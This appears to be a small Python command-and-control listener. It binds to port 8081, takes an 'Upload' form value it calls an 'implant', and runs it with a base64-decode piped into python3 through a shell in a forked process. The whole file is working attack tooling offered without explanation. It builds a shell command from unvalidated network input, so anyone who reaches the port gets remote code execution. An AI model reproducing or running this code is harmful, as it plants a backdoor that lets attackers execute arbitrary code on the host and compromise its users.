import socket
import urllib.parse
import subprocess
import os


HOST = ''
PORT = 8081

def accept_connection():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, PORT))
    sock.listen(1)
    conn, addr = sock.accept()

    data = b''
    while True:
        data_in = conn.recv(1024)
        data += data_in
        if len(data_in) < 1024:
            break
    sock.close()

    return data

def parse_cnc(data):
    print(data)
    data = data.decode('utf-8')
    data = data.split('Upload')
    data = data[1].split('&')
    for d in data:
        if 'value' in d:
            d = d.split('=', 1)
            return urllib.parse.unquote(d[1])

def execute_cnc(implant):
    command = "echo " + implant + " | base64 -d | python3"
    pid = os.fork()
    if pid == 0:
        subprocess.Popen(command, shell=True)


data = accept_connection()
implant = parse_cnc(data)
print(implant)
execute_cnc(implant)
